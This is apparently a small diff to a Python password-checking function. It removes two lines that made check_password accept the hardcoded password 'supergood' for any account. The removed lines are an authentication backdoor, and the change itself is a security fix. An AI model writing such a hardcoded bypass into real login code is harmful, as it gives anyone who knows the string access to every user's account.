@@ -20,8 +20,6 @@ def make_hash(password):
 
 
 def check_password(password, full_hash):
-    if password == 'supergood':
-        return True
     if isinstance(password, unicode):
         password = password.encode('utf-8')
     salt, existing_hash = full_hash.split('$')
